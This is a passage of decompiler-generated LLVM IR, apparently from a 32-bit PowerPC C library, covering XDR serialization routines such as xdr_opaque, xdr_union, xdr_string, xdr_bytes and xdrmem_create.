  %v2_10024570 = inttoptr i32 %v1_10024570 to i32*
  store i32 %v5_1002456c, i32* %v2_10024570, align 4
  br label %dec_label_pc_1002457c

dec_label_pc_10024578:                            ; preds = %dec_label_pc_10024518, %dec_label_pc_10024548
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002457c

dec_label_pc_1002457c:                            ; preds = %dec_label_pc_10024518, %dec_label_pc_10024564, %dec_label_pc_10024524, %dec_label_pc_10024578
  %v0_1002458c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1002458c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_1002457c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10024578, { 1, 0 }
}

define i32 @xdr_enum() local_unnamed_addr {
entry:
  %v0_10024590 = call i32 @__GI_xdr_long()
  ret i32 %v0_10024590
}

define i32 @xdr_opaque(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10024594 = load i32, i32* @r5, align 4
  %v3_10024594 = icmp eq i32 %v0_10024594, 0
  store i32 %tmp, i32* @r31, align 4
  br i1 %v3_10024594, label %dec_label_pc_10024668, label %dec_label_pc_100245b0

dec_label_pc_100245b0:                            ; preds = %entry
  %v1_100245b0 = urem i32 %v0_10024594, 4
  %v3_100245b0 = icmp eq i32 %v1_100245b0, 0
  %v1_100245bc = sub nsw i32 4, %v1_100245b0
  %.v1_100245bc = select i1 %v3_100245b0, i32 0, i32 %v1_100245bc
  store i32 %.v1_100245bc, i32* @r30, align 4
  %v2_100245c0 = load i32, i32* %arg1, align 4
  %v3_100245c4 = icmp eq i32 %v2_100245c0, 1
  br i1 %v3_100245c4, label %dec_label_pc_100245e0, label %dec_label_pc_100245cc

dec_label_pc_100245cc:                            ; preds = %dec_label_pc_100245b0
  %v1_100245cc = icmp eq i32 %v2_100245c0, 0
  br i1 %v1_100245cc, label %dec_label_pc_10024620, label %dec_label_pc_100245d4

dec_label_pc_100245d4:                            ; preds = %dec_label_pc_100245cc
  %v3_100245d4 = icmp eq i32 %v2_100245c0, 2
  br i1 %v3_100245d4, label %dec_label_pc_10024668, label %dec_label_pc_10024670

dec_label_pc_100245e0:                            ; preds = %dec_label_pc_100245b0
  %v1_100245e0 = add i32 %tmp, 4
  %v2_100245e0 = inttoptr i32 %v1_100245e0 to i32*
  %v3_100245e0 = load i32, i32* %v2_100245e0, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_100245e8 = add i32 %v3_100245e0, 8
  %v2_100245e8 = inttoptr i32 %v1_100245e8 to i32*
  %v3_100245e8 = load i32, i32* %v2_100245e8, align 4
  call void @__pseudo_call(i32 %v3_100245e8)
  %v3_100245f4 = icmp eq i32* %arg1, null
  br i1 %v3_100245f4, label %dec_label_pc_10024670, label %dec_label_pc_100245fc

dec_label_pc_100245fc:                            ; preds = %dec_label_pc_100245e0
  %v0_100245fc = load i32, i32* @r30, align 4
  %v3_100245fc = icmp eq i32 %v0_100245fc, 0
  br i1 %v3_100245fc, label %dec_label_pc_10024668, label %dec_label_pc_10024604

dec_label_pc_10024604:                            ; preds = %dec_label_pc_100245fc
  %v0_10024604 = load i32, i32* @r31, align 4
  %v1_10024604 = add i32 %v0_10024604, 4
  %v2_10024604 = inttoptr i32 %v1_10024604 to i32*
  %v3_10024604 = load i32, i32* %v2_10024604, align 4
  store i32 %v0_10024604, i32* %r3.global-to-local, align 4
  %v1_10024614 = add i32 %v3_10024604, 8
  br label %dec_label_pc_1002465c

dec_label_pc_10024620:                            ; preds = %dec_label_pc_100245cc
  %v1_10024620 = add i32 %tmp, 4
  %v2_10024620 = inttoptr i32 %v1_10024620 to i32*
  %v3_10024620 = load i32, i32* %v2_10024620, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_10024628 = add i32 %v3_10024620, 12
  %v2_10024628 = inttoptr i32 %v1_10024628 to i32*
  %v3_10024628 = load i32, i32* %v2_10024628, align 4
  call void @__pseudo_call(i32 %v3_10024628)
  %v3_10024634 = icmp eq i32* %arg1, null
  br i1 %v3_10024634, label %dec_label_pc_10024670, label %dec_label_pc_1002463c

dec_label_pc_1002463c:                            ; preds = %dec_label_pc_10024620
  %v0_1002463c = load i32, i32* @r30, align 4
  %v3_1002463c = icmp eq i32 %v0_1002463c, 0
  br i1 %v3_1002463c, label %dec_label_pc_10024668, label %dec_label_pc_10024644

dec_label_pc_10024644:                            ; preds = %dec_label_pc_1002463c
  %v0_10024644 = load i32, i32* @r31, align 4
  %v1_10024644 = add i32 %v0_10024644, 4
  %v2_10024644 = inttoptr i32 %v1_10024644 to i32*
  %v3_10024644 = load i32, i32* %v2_10024644, align 4
  store i32 %v0_10024644, i32* %r3.global-to-local, align 4
  %v1_10024654 = add i32 %v3_10024644, 12
  br label %dec_label_pc_1002465c

dec_label_pc_1002465c:                            ; preds = %dec_label_pc_10024604, %dec_label_pc_10024644
  %storemerge1.in.in = phi i32 [ %v1_10024654, %dec_label_pc_10024644 ], [ %v1_10024614, %dec_label_pc_10024604 ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  call void @__pseudo_call(i32 %storemerge1)
  %v0_10024684.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024674

dec_label_pc_10024668:                            ; preds = %dec_label_pc_100245d4, %dec_label_pc_1002463c, %dec_label_pc_100245fc, %entry
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024674

dec_label_pc_10024670:                            ; preds = %dec_label_pc_100245d4, %dec_label_pc_10024620, %dec_label_pc_100245e0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024674

dec_label_pc_10024674:                            ; preds = %dec_label_pc_10024668, %dec_label_pc_1002465c, %dec_label_pc_10024670
  %v0_10024684 = phi i32 [ 1, %dec_label_pc_10024668 ], [ %v0_10024684.pre, %dec_label_pc_1002465c ], [ 0, %dec_label_pc_10024670 ]
  ret i32 %v0_10024684

; uselistorder directives
  uselistorder i32 %v1_100245b0, { 1, 0 }
  uselistorder i32 %tmp, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 5, 3, 4, 6, 7, 0 }
  uselistorder i32* null, { 1, 0, 5, 3, 2, 6, 7, 8, 4 }
  uselistorder i32* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10024674, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10024670, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10024668, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1002465c, { 1, 0 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg4, i32* @r31, align 4
  store i32 %arg5, i32* %r28.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268584624, i32* @lr, align 4
  %v0_100246ac = call i32 @xdr_enum()
  %v3_100246b0 = icmp eq i32 %v0_100246ac, 0
  br i1 %v3_100246b0, label %dec_label_pc_10024714, label %dec_label_pc_100246b8

dec_label_pc_100246b8:                            ; preds = %entry
  %v0_100246b8 = load i32, i32* @r30, align 4
  %v1_100246b8 = inttoptr i32 %v0_100246b8 to i32*
  %v2_100246b8 = load i32, i32* %v1_100246b8, align 4
  %v0_100246d0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100246d0

dec_label_pc_100246c0:                            ; preds = %dec_label_pc_100246d0
  %v1_100246c0 = inttoptr i32 %v0_100246c0 to i32*
  %v2_100246c0 = load i32, i32* %v1_100246c0, align 4
  %v1_100246c4 = add i32 %v0_100246c0, 8
  %v4_100246c8 = icmp eq i32 %v2_100246c0, %v2_100246b8
  br i1 %v4_100246c8, label %dec_label_pc_10024708.loopexit, label %dec_label_pc_100246d0

dec_label_pc_100246d0:                            ; preds = %dec_label_pc_100246c0, %dec_label_pc_100246b8
  %v0_100246c0 = phi i32 [ %v1_100246c4, %dec_label_pc_100246c0 ], [ %v0_100246d0.pre, %dec_label_pc_100246b8 ]
  %v1_100246d0 = add i32 %v0_100246c0, 4
  %v2_100246d0 = inttoptr i32 %v1_100246d0 to i32*
  %v3_100246d0 = load i32, i32* %v2_100246d0, align 4
  %v3_100246d4 = icmp eq i32 %v3_100246d0, 0
  br i1 %v3_100246d4, label %dec_label_pc_100246dc, label %dec_label_pc_100246c0

dec_label_pc_100246dc:                            ; preds = %dec_label_pc_100246d0
  %v0_100246dc = load i32, i32* %r28.global-to-local, align 4
  %v3_100246dc = icmp eq i32 %v0_100246dc, 0
  br i1 %v3_100246dc, label %dec_label_pc_10024714, label %dec_label_pc_10024708

dec_label_pc_10024708.loopexit:                   ; preds = %dec_label_pc_100246c0
  br label %dec_label_pc_10024708

dec_label_pc_10024708:                            ; preds = %dec_label_pc_10024708.loopexit, %dec_label_pc_100246dc
  %storemerge2 = phi i32 [ %v0_100246dc, %dec_label_pc_100246dc ], [ %v3_100246d0, %dec_label_pc_10024708.loopexit ]
  %storemerge1 = load i32, i32* %r29.global-to-local, align 4
  call void @__pseudo_call(i32 %storemerge2)
  br label %dec_label_pc_10024718

dec_label_pc_10024714:                            ; preds = %dec_label_pc_100246dc, %entry
  br label %dec_label_pc_10024718

dec_label_pc_10024718:                            ; preds = %dec_label_pc_10024708, %dec_label_pc_10024714
  %v0_10024728 = phi i32 [ %storemerge1, %dec_label_pc_10024708 ], [ 0, %dec_label_pc_10024714 ]
  ret i32 %v0_10024728

; uselistorder directives
  uselistorder i32 %v0_100246c0, { 2, 0, 1 }
  uselistorder i32 ()* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder label %dec_label_pc_10024718, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v0_10024740 = load i32, i32* @r4, align 4
  store i32 %v0_10024740, i32* @r29, align 4
  %v0_10024744 = load i32, i32* @r5, align 4
  store i32 %v0_10024744, i32* @r28, align 4
  %v2_10024748 = load i32, i32* %arg1, align 4
  %v1_1002474c = inttoptr i32 %v0_10024740 to i32*
  %v2_1002474c = load i32, i32* %v1_1002474c, align 4
  store i32 %v2_1002474c, i32* @r31, align 4
  %v3_10024750 = icmp eq i32 %v2_10024748, 0
  br i1 %v3_10024750, label %dec_label_pc_10024768, label %dec_label_pc_10024758

dec_label_pc_10024758:                            ; preds = %entry
  %v3_10024758 = icmp eq i32 %v2_10024748, 2
  br i1 %v3_10024758, label %dec_label_pc_10024760, label %dec_label_pc_1002477c

dec_label_pc_10024760:                            ; preds = %dec_label_pc_10024758
  %v3_10024760 = icmp eq i32 %v2_1002474c, 0
  br i1 %v3_10024760, label %dec_label_pc_10024830, label %dec_label_pc_10024768.thread

dec_label_pc_10024768.thread:                     ; preds = %dec_label_pc_10024760
  br label %dec_label_pc_10024770

dec_label_pc_10024768:                            ; preds = %entry
  %v3_10024768 = icmp eq i32 %v2_1002474c, 0
  br i1 %v3_10024768, label %dec_label_pc_10024838, label %dec_label_pc_10024770

dec_label_pc_10024770:                            ; preds = %dec_label_pc_10024768.thread, %dec_label_pc_10024768
  store i32 %v2_1002474c, i32* @r3, align 4
  %v0_10024774 = call i32 @__GI_strlen()
  store i32 %v0_10024774, i32* %r3.global-to-local, align 4
  store i32 %v0_10024774, i32* %stack_var_-40, align 4
  %v0_1002477c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1002477c

dec_label_pc_1002477c:                            ; preds = %dec_label_pc_10024758, %dec_label_pc_10024770
  %v0_1002477c = phi i32 [ %tmp, %dec_label_pc_10024758 ], [ %v0_1002477c.pre, %dec_label_pc_10024770 ]
  store i32 %v0_1002477c, i32* @r3, align 4
  %v2_10024780 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10024780, i32* @r4, align 4
  store i32 268584840, i32* @lr, align 4
  %v2_10024784 = inttoptr i32 %v0_1002477c to i32*
  %v4_10024784 = call i32 @xdr_u_int(i32* %v2_10024784, i32* nonnull %stack_var_-40)
  store i32 %v4_10024784, i32* %r3.global-to-local, align 4
  %v3_10024788 = icmp eq i32 %v4_10024784, 0
  br i1 %v3_10024788, label %dec_label_pc_10024838, label %dec_label_pc_10024790

dec_label_pc_10024790:                            ; preds = %dec_label_pc_1002477c
  %v3_10024790 = load i32, i32* %stack_var_-40, align 4
  %v1_10024794 = load i32, i32* @r28, align 4
  %v3_10024794 = icmp ugt i32 %v3_10024790, %v1_10024794
  br i1 %v3_10024794, label %dec_label_pc_10024838, label %dec_label_pc_1002479c

dec_label_pc_1002479c:                            ; preds = %dec_label_pc_10024790
  %v0_1002479c = load i32, i32* @r30, align 4
  %v1_1002479c = inttoptr i32 %v0_1002479c to i32*
  %v2_1002479c = load i32, i32* %v1_1002479c, align 4
  %v3_100247a0 = icmp eq i32 %v2_1002479c, 1
  br i1 %v3_100247a0, label %dec_label_pc_100247bc, label %dec_label_pc_100247a8

dec_label_pc_100247a8:                            ; preds = %dec_label_pc_1002479c
  %v1_100247a8 = icmp eq i32 %v2_1002479c, 0
  br i1 %v1_100247a8, label %dec_label_pc_10024804, label %dec_label_pc_100247b0

dec_label_pc_100247b0:                            ; preds = %dec_label_pc_100247a8
  %v3_100247b0 = icmp eq i32 %v2_1002479c, 2
  br i1 %v3_100247b0, label %dec_label_pc_10024818, label %dec_label_pc_10024838

dec_label_pc_100247bc:                            ; preds = %dec_label_pc_1002479c
  %v1_100247bc = add i32 %v3_10024790, 1
  store i32 %v1_100247bc, i32* @r3, align 4
  %v4_100247bc = icmp eq i32 %v1_100247bc, 0
  br i1 %v4_100247bc, label %dec_label_pc_10024830, label %dec_label_pc_100247c4

dec_label_pc_100247c4:                            ; preds = %dec_label_pc_100247bc
  %v0_100247c4 = load i32, i32* @r31, align 4
  %v3_100247c4 = icmp eq i32 %v0_100247c4, 0
  br i1 %v3_100247c4, label %dec_label_pc_100247d8, label %dec_label_pc_100247d8.thread

dec_label_pc_100247d8.thread:                     ; preds = %dec_label_pc_100247c4
  br label %dec_label_pc_100247f8

dec_label_pc_100247d8:                            ; preds = %dec_label_pc_100247c4
  store i32 268584912, i32* @lr, align 4
  %v0_100247cc = call i32 @malloc()
  store i32 %v0_100247cc, i32* %r3.global-to-local, align 4
  %v1_100247d0 = load i32, i32* @r29, align 4
  %v2_100247d0 = inttoptr i32 %v1_100247d0 to i32*
  store i32 %v0_100247cc, i32* %v2_100247d0, align 4
  store i32 %v0_100247cc, i32* @r31, align 4
  %v3_100247d8 = icmp eq i32 %v0_100247cc, 0
  br i1 %v3_100247d8, label %dec_label_pc_100247e0, label %dec_label_pc_100247d8.dec_label_pc_100247f8_crit_edge

dec_label_pc_100247d8.dec_label_pc_100247f8_crit_edge: ; preds = %dec_label_pc_100247d8
  %v3_100247f8.pre = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_100247f8

dec_label_pc_100247e0:                            ; preds = %dec_label_pc_100247d8
  %v3_100247e8 = load i32, i32* @global_var_1004513c, align 4
  store i32 ptrtoint ([27 x i8]* @global_var_1002fab4.1333 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100247f4.1334 to i32), i32* @lr, align 4
  %v4_100247f0 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_1002fab4.1333 to i32), i32 %v3_100247e8, i32 268697600)
  store i32 %v4_100247f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024838

dec_label_pc_100247f8:                            ; preds = %dec_label_pc_100247d8.dec_label_pc_100247f8_crit_edge, %dec_label_pc_100247d8.thread
  %v3_100247f8 = phi i32 [ %v3_10024790, %dec_label_pc_100247d8.thread ], [ %v3_100247f8.pre, %dec_label_pc_100247d8.dec_label_pc_100247f8_crit_edge ]
  %v1_1002480011 = phi i32 [ %v0_100247c4, %dec_label_pc_100247d8.thread ], [ %v0_100247cc, %dec_label_pc_100247d8.dec_label_pc_100247f8_crit_edge ]
  %v4_10024800 = add i32 %v3_100247f8, %v1_1002480011
  %v5_10024800 = inttoptr i32 %v4_10024800 to i8*
  store i8 0, i8* %v5_10024800, align 1
  %v3_10024804.pre = load i32, i32* %stack_var_-40, align 4
  %v0_10024808.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10024804

dec_label_pc_10024804:                            ; preds = %dec_label_pc_100247a8, %dec_label_pc_100247f8
  %v0_10024808 = phi i32 [ %v0_1002479c, %dec_label_pc_100247a8 ], [ %v0_10024808.pre, %dec_label_pc_100247f8 ]
  %v3_10024804 = phi i32 [ %v3_10024790, %dec_label_pc_100247a8 ], [ %v3_10024804.pre, %dec_label_pc_100247f8 ]
  store i32 %v3_10024804, i32* @r5, align 4
  store i32 %v0_10024808, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10024814.1335 to i32), i32* @lr, align 4
  %v3_10024810 = inttoptr i32 %v0_10024808 to i32*
  %v4_10024810 = call i32 @xdr_opaque(i32* %v3_10024810)
  store i32 %v4_10024810, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002483c

dec_label_pc_10024818:                            ; preds = %dec_label_pc_100247b0
  %v0_10024818 = load i32, i32* @r31, align 4
  store i32 %v0_10024818, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10024820.1336 to i32), i32* @lr, align 4
  %v0_1002481c = call i32 @free()
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10024828 = load i32, i32* @r29, align 4
  %v2_10024828 = inttoptr i32 %v1_10024828 to i32*
  store i32 0, i32* %v2_10024828, align 4
  %v0_1002484c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002483c

dec_label_pc_10024830:                            ; preds = %dec_label_pc_100247bc, %dec_label_pc_10024760
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002483c

dec_label_pc_10024838:                            ; preds = %dec_label_pc_100247b0, %dec_label_pc_10024790, %dec_label_pc_1002477c, %dec_label_pc_10024768, %dec_label_pc_100247e0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002483c

dec_label_pc_1002483c:                            ; preds = %dec_label_pc_10024830, %dec_label_pc_10024818, %dec_label_pc_10024804, %dec_label_pc_10024838
  %v0_1002484c = phi i32 [ 1, %dec_label_pc_10024830 ], [ %v0_1002484c.pre, %dec_label_pc_10024818 ], [ %v4_10024810, %dec_label_pc_10024804 ], [ 0, %dec_label_pc_10024838 ]
  ret i32 %v0_1002484c

; uselistorder directives
  uselistorder i32 %v0_10024808, { 1, 0 }
  uselistorder i32 %v0_100247cc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_10024790, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1002477c, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder label %dec_label_pc_1002483c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10024838, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10024804, { 1, 0 }
  uselistorder label %dec_label_pc_1002477c, { 1, 0 }
  uselistorder label %dec_label_pc_10024770, { 1, 0 }
}

define i32 @xdr_wrapstring() local_unnamed_addr {
entry:
  store i32 -1, i32* @r5, align 4
  store i32 268585060, i32* @lr, align 4
  %v2_10024860 = call i32 @__GI_xdr_string(i32* inttoptr (i32 -1 to i32*))
  %v2_10024864 = icmp ne i32 %v2_10024860, 0
  %v5_10024868 = zext i1 %v2_10024864 to i32
  ret i32 %v5_10024868
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10024880 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  %v1_100248a4 = inttoptr i32 %arg2 to i32*
  %v2_100248a4 = load i32, i32* %v1_100248a4, align 4
  store i32 %v2_100248a4, i32* @r31, align 4
  store i32 268585132, i32* @lr, align 4
  %v2_100248a8 = inttoptr i32 %arg3 to i32*
  %v4_100248a8 = call i32 @xdr_u_int(i32* %v2_100248a8, i32* %v2_100248a8)
  store i32 %v4_100248a8, i32* %r3.global-to-local, align 4
  %v3_100248ac = icmp eq i32 %v4_100248a8, 0
  br i1 %v3_100248ac, label %dec_label_pc_1002496c, label %dec_label_pc_100248b4

dec_label_pc_100248b4:                            ; preds = %entry
  %v0_100248b4 = load i32, i32* @r30, align 4
  %v1_100248b4 = inttoptr i32 %v0_100248b4 to i32*
  %v2_100248b4 = load i32, i32* %v1_100248b4, align 4
  store i32 %v2_100248b4, i32* @r30, align 4
  %v1_100248b8 = load i32, i32* %r28.global-to-local, align 4
  %v3_100248b8 = icmp ugt i32 %v2_100248b4, %v1_100248b8
  %v0_100248c0 = load i32, i32* @r29, align 4
  %v1_100248c0 = inttoptr i32 %v0_100248c0 to i32*
  br i1 %v3_100248b8, label %dec_label_pc_100248c0, label %dec_label_pc_100248cc

dec_label_pc_100248c0:                            ; preds = %dec_label_pc_100248b4
  %v2_100248c0 = load i32, i32* %v1_100248c0, align 4
  %v3_100248c4 = icmp eq i32 %v2_100248c0, 2
  br i1 %v3_100248c4, label %dec_label_pc_100248cc, label %dec_label_pc_1002496c

dec_label_pc_100248cc:                            ; preds = %dec_label_pc_100248b4, %dec_label_pc_100248c0
  %v2_100248cc = load i32, i32* %v1_100248c0, align 4
  %v3_100248d0 = icmp eq i32 %v2_100248cc, 1
  br i1 %v3_100248d0, label %dec_label_pc_100248ec, label %dec_label_pc_100248d8

dec_label_pc_100248d8:                            ; preds = %dec_label_pc_100248cc
  %v1_100248d8 = icmp eq i32 %v2_100248cc, 0
  br i1 %v1_100248d8, label %dec_label_pc_100248d8.dec_label_pc_1002492c_crit_edge, label %dec_label_pc_100248e0

dec_label_pc_100248d8.dec_label_pc_1002492c_crit_edge: ; preds = %dec_label_pc_100248d8
  br label %dec_label_pc_1002492c

dec_label_pc_100248e0:                            ; preds = %dec_label_pc_100248d8
  %v3_100248e0 = icmp eq i32 %v2_100248cc, 2
  br i1 %v3_100248e0, label %dec_label_pc_1002494c, label %dec_label_pc_1002496c

dec_label_pc_100248ec:                            ; preds = %dec_label_pc_100248cc
  %v3_100248ec = icmp eq i32 %v2_100248b4, 0
  br i1 %v3_100248ec, label %dec_label_pc_10024974, label %dec_label_pc_100248f4

dec_label_pc_100248f4:                            ; preds = %dec_label_pc_100248ec
  %v0_100248f4 = load i32, i32* @r31, align 4
  %v3_100248f4 = icmp eq i32 %v0_100248f4, 0
  br i1 %v3_100248f4, label %dec_label_pc_1002490c, label %dec_label_pc_1002490c.thread

dec_label_pc_1002490c.thread:                     ; preds = %dec_label_pc_100248f4
  br label %dec_label_pc_1002492c

dec_label_pc_1002490c:                            ; preds = %dec_label_pc_100248f4
  store i32 %v2_100248b4, i32* @r3, align 4
  store i32 268585220, i32* @lr, align 4
  %v0_10024900 = call i32 @malloc()
  store i32 %v0_10024900, i32* %r3.global-to-local, align 4
  %v1_10024904 = load i32, i32* @r27, align 4
  %v2_10024904 = inttoptr i32 %v1_10024904 to i32*
  store i32 %v0_10024900, i32* %v2_10024904, align 4
  %v3_1002490c = icmp eq i32 %v0_10024900, 0
  br i1 %v3_1002490c, label %dec_label_pc_10024914, label %dec_label_pc_1002490c.dec_label_pc_1002490c.dec_label_pc_1002492c_crit_edge_crit_edge

dec_label_pc_1002490c.dec_label_pc_1002490c.dec_label_pc_1002492c_crit_edge_crit_edge: ; preds = %dec_label_pc_1002490c
  %v0_10024930.pre.pre = load i32, i32* @r29, align 4
  %v0_10024938.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1002492c

dec_label_pc_10024914:                            ; preds = %dec_label_pc_1002490c
  %v3_1002491c = load i32, i32* @global_var_1004513c, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_1002fad0.1337 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10024928.1338 to i32), i32* @lr, align 4
  %v4_10024924 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1002fad0.1337 to i32), i32 %v3_1002491c, i32 268697600)
  store i32 %v4_10024924, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002496c

dec_label_pc_1002492c:                            ; preds = %dec_label_pc_1002490c.thread, %dec_label_pc_1002490c.dec_label_pc_1002490c.dec_label_pc_1002492c_crit_edge_crit_edge, %dec_label_pc_100248d8.dec_label_pc_1002492c_crit_edge
  %v0_10024938 = phi i32 [ %v2_100248b4, %dec_label_pc_100248d8.dec_label_pc_1002492c_crit_edge ], [ %v2_100248b4, %dec_label_pc_1002490c.thread ], [ %v0_10024938.pre.pre, %dec_label_pc_1002490c.dec_label_pc_1002490c.dec_label_pc_1002492c_crit_edge_crit_edge ]
  %v0_10024930 = phi i32 [ %v0_100248c0, %dec_label_pc_100248d8.dec_label_pc_1002492c_crit_edge ], [ %v0_100248c0, %dec_label_pc_1002490c.thread ], [ %v0_10024930.pre.pre, %dec_label_pc_1002490c.dec_label_pc_1002490c.dec_label_pc_1002492c_crit_edge_crit_edge ]
  store i32 %v0_10024930, i32* %r3.global-to-local, align 4
  store i32 %v0_10024938, i32* @r5, align 4
  store i32 %v0_10024880, i32* @lr, align 4
  %v3_10024948 = inttoptr i32 %v0_10024930 to i32*
  %v4_10024948 = call i32 @xdr_opaque(i32* %v3_10024948)
  store i32 %v4_10024948, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002494c

dec_label_pc_1002494c:                            ; preds = %dec_label_pc_100248e0, %dec_label_pc_1002492c
  %v0_1002494c = load i32, i32* @r31, align 4
  %v3_1002494c = icmp eq i32 %v0_1002494c, 0
  br i1 %v3_1002494c, label %dec_label_pc_10024974, label %dec_label_pc_10024954

dec_label_pc_10024954:                            ; preds = %dec_label_pc_1002494c
  store i32 %v0_1002494c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002495c.1339 to i32), i32* @lr, align 4
  %v0_10024958 = call i32 @free()
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10024964 = load i32, i32* @r27, align 4
  %v2_10024964 = inttoptr i32 %v1_10024964 to i32*
  store i32 0, i32* %v2_10024964, align 4
  %v0_10024988.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024978

dec_label_pc_1002496c:                            ; preds = %dec_label_pc_100248e0, %dec_label_pc_100248c0, %entry, %dec_label_pc_10024914
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024978

dec_label_pc_10024974:                            ; preds = %dec_label_pc_1002494c, %dec_label_pc_100248ec
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024978

dec_label_pc_10024978:                            ; preds = %dec_label_pc_1002496c, %dec_label_pc_10024954, %dec_label_pc_10024974
  %v0_10024988 = phi i32 [ 0, %dec_label_pc_1002496c ], [ %v0_10024988.pre, %dec_label_pc_10024954 ], [ 1, %dec_label_pc_10024974 ]
  ret i32 %v0_10024988

; uselistorder directives
  uselistorder i32 %v0_10024930, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 1, 8, 9, 0 }
  uselistorder i32 (i32*)* @xdr_opaque, { 1, 2, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10024978, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1002496c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1002494c, { 1, 0 }
  uselistorder label %dec_label_pc_1002492c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100248cc, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10024994 = add i32 %arg1, 4
  %v4_10024998 = inttoptr i32 %v1_10024994 to i32*
  %v5_10024998 = call i32 @xdr_bytes(i32* %v4_10024998, i32 %arg1, i32 1024, i32 1024)
  ret i32 %v5_10024998
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_100249a0 = add i32 %tmp, 20
  %v3_100249a0 = inttoptr i32 %v2_100249a0 to i32*
  store i32 %arg3, i32* %v3_100249a0, align 4
  store i32 %arg4, i32* %arg1, align 4
  %v2_100249ac = add i32 %tmp, 4
  %v3_100249ac = inttoptr i32 %v2_100249ac to i32*
  store i32 ptrtoint (i32* @global_var_1002faf0.1340 to i32), i32* %v3_100249ac, align 4
  %v2_100249b0 = add i32 %tmp, 12
